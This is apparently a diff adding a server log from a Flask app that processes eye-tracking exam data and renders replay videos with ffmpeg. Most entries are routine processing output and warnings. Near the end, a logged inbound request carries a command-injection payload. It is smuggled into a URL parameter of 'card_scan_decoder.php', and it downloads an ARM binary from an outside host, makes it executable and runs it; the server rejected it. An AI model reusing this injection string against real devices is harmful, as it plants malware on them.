@@ -1,0 +1,1129 @@
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:root:Processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63
+Processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63
+/home/ubuntu/anaconda3/envs/reactn/lib/python3.6/site-packages/pandas/core/indexing.py:961: FutureWarning: 
+Passing list-likes to .loc or [] with any missing label will raise
+KeyError in the future, you can use .reindex() as an alternative.
+
+See the documentation here:
+https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#deprecate-loc-reindex-listlike
+  return getattr(section, self.name)[new_key]
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1675_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1675_replay.mp4']
+INFO:root:Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+INFO:werkzeug:201.244.239.157 - - [02/Feb/2020 18:33:19] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [02/Feb/2020 18:33:19] "GET /process HTTP/1.1" 200 -
+INFO:werkzeug:201.244.239.157 - - [02/Feb/2020 18:33:19] "GET /favicon.ico HTTP/1.1" 404 -
+201.244.239.157 - - [02/Feb/2020 18:33:19] "GET /favicon.ico HTTP/1.1" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1676_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '46.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1676_replay.mp4']
+INFO:root:Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+INFO:werkzeug:18.232.131.174 - - [02/Feb/2020 18:35:07] "GET /process HTTP/1.1" 200 -
+18.232.131.174 - - [02/Feb/2020 18:35:07] "GET /process HTTP/1.1" 200 -
+INFO:werkzeug:18.232.131.174 - - [02/Feb/2020 18:35:08] "GET /favicon.ico HTTP/1.1" 404 -
+18.232.131.174 - - [02/Feb/2020 18:35:08] "GET /favicon.ico HTTP/1.1" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1677_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1677_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1678_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1678_replay.mp4']
+INFO:root:Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+Currently processing: 37aeb16e-026f-4ab4-991b-a09ff3ee1d63<br>417 left to go
+INFO:werkzeug:201.244.239.157 - - [02/Feb/2020 18:39:25] "GET /process HTTP/1.1" 200 -
+201.244.239.157 - - [02/Feb/2020 18:39:25] "GET /process HTTP/1.1" 200 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1679_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '47.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/37aeb16e-026f-4ab4-991b-a09ff3ee1d63/figures/1679_replay.mp4']
+INFO:root:Processing: 510ea062-5975-482e-96f9-4010279970da
+Processing: 510ea062-5975-482e-96f9-4010279970da
+WARNING:root:Duplicate columns in df.
+Duplicate columns in df.
+WARNING:root:visit_exam_id: 2129
+visit_exam_id: 2129
+INFO:root:Processing: 1e816281-f5cc-478a-935d-9a4c2fb743d8
+Processing: 1e816281-f5cc-478a-935d-9a4c2fb743d8
+WARNING:root:Empty data for visit_exam_id: 1798
+Empty data for visit_exam_id: 1798
+WARNING:root:Empty data for visit_exam_id: 1799
+Empty data for visit_exam_id: 1799
+WARNING:root:Empty data for visit_exam_id: 1800
+Empty data for visit_exam_id: 1800
+WARNING:root:Empty data for visit_exam_id: 1802
+Empty data for visit_exam_id: 1802
+WARNING:root:Empty data for visit_exam_id: 1803
+Empty data for visit_exam_id: 1803
+WARNING:root:Empty data for visit_exam_id: 1804
+Empty data for visit_exam_id: 1804
+WARNING:root:Empty data for visit_exam_id: 1805
+Empty data for visit_exam_id: 1805
+WARNING:root:Empty data for visit_exam_id: 1806
+Empty data for visit_exam_id: 1806
+/home/ubuntu/reactrack/saccades.py:54: RuntimeWarning: divide by zero encountered in true_divide
+  v = np.abs(np.diff(z)) / np.diff(t)
+WARNING:root:Could not analyze - Gaze with error:
+Could not analyze - Gaze with error:
+WARNING:root:`x` must be strictly increasing sequence.
+`x` must be strictly increasing sequence.
+INFO:root:Processing: 27186d9b-49d5-450b-83aa-aefeb2cefeca
+Processing: 27186d9b-49d5-450b-83aa-aefeb2cefeca
+WARNING:root:Could not analyze - Prosaccade with error:
+Could not analyze - Prosaccade with error:
+WARNING:root:max() arg is an empty sequence
+max() arg is an empty sequence
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2419_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2419_replay.mp4']
+WARNING:root:Issue analysis @ Line 382
+Issue analysis @ Line 382
+/home/ubuntu/reactrack/analysis.py:380: RuntimeWarning: Mean of empty slice
+  pupil = pupil - np.nanmean(pupil[stim_idx - 5: stim_idx])
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2420_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2420_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2421_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2421_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2422_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/27186d9b-49d5-450b-83aa-aefeb2cefeca/figures/2422_replay.mp4']
+INFO:root:Processing: 4ea2547b-3583-495b-a16d-826979601b22
+Processing: 4ea2547b-3583-495b-a16d-826979601b22
+WARNING:root:Empty data for visit_exam_id: 2298
+Empty data for visit_exam_id: 2298
+WARNING:root:Empty data for visit_exam_id: 2299
+Empty data for visit_exam_id: 2299
+WARNING:root:Empty data for visit_exam_id: 2300
+Empty data for visit_exam_id: 2300
+WARNING:root:Empty data for visit_exam_id: 2301
+Empty data for visit_exam_id: 2301
+WARNING:root:Empty data for visit_exam_id: 2302
+Empty data for visit_exam_id: 2302
+INFO:root:Processing: c06d8e2b-2010-4004-82ba-2ae683d95bb5
+Processing: c06d8e2b-2010-4004-82ba-2ae683d95bb5
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2594_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2594_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2595_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2595_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2596_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2596_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2597_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2597_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2598_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/c06d8e2b-2010-4004-82ba-2ae683d95bb5/figures/2598_replay.mp4']
+INFO:root:Processing: f58b319e-7bb9-42ac-9de4-ce29d911a91f
+Processing: f58b319e-7bb9-42ac-9de4-ce29d911a91f
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2424_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2424_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2425_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2425_replay.mp4']
+/home/ubuntu/reactrack/analysis.py:380: RuntimeWarning: Mean of empty slice
+  pupil = pupil - np.nanmean(pupil[stim_idx - 5: stim_idx])
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2426_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2426_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2427_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2427_replay.mp4']
+INFO:werkzeug:178.73.215.171 - - [02/Feb/2020 19:19:48] "GET / HTTP/1.0" 404 -
+178.73.215.171 - - [02/Feb/2020 19:19:48] "GET / HTTP/1.0" 404 -
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2428_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f58b319e-7bb9-42ac-9de4-ce29d911a91f/figures/2428_replay.mp4']
+INFO:root:Processing: f314882a-4af6-49c7-adf8-8de2ed304084
+Processing: f314882a-4af6-49c7-adf8-8de2ed304084
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2461_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2461_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2462_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2462_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2463_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2463_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2464_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2464_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2465_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/f314882a-4af6-49c7-adf8-8de2ed304084/figures/2465_replay.mp4']
+INFO:root:Processing: bf641785-346d-4688-b3aa-feb1b55da13d
+Processing: bf641785-346d-4688-b3aa-feb1b55da13d
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2503_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2503_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2504_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2504_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2505_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2505_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2506_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2506_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2507_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/bf641785-346d-4688-b3aa-feb1b55da13d/figures/2507_replay.mp4']
+INFO:root:Processing: 7720135b-619d-4067-8eba-b2616889777b
+Processing: 7720135b-619d-4067-8eba-b2616889777b
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7720135b-619d-4067-8eba-b2616889777b/figures/1938_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/7720135b-619d-4067-8eba-b2616889777b/figures/1938_replay.mp4']
+INFO:root:Processing: 650eced8-0b6f-49ec-b84a-87b292a7a566
+Processing: 650eced8-0b6f-49ec-b84a-87b292a7a566
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2430_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '55.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2430_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2431_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/650eced8-0b6f-49ec-b84a-87b292a7a566/figures/2431_replay.mp4']
+ERROR:werkzeug:62.86.211.49 - - [02/Feb/2020 19:49:29] code 400, message Bad request syntax ('GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1')
+62.86.211.49 - - [02/Feb/2020 19:49:29] code 400, message Bad request syntax ('GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1')
+INFO:werkzeug:62.86.211.49 - - [02/Feb/2020 19:49:29] "GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1" HTTPStatus.BAD_REQUEST -
+62.86.211.49 - - [02/Feb/2020 19:49:29] "GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1" HTTPStatus.BAD_REQUEST -
+WARNING:root:Issue analysis @ Line 382
+Issue analysis @ Line 382
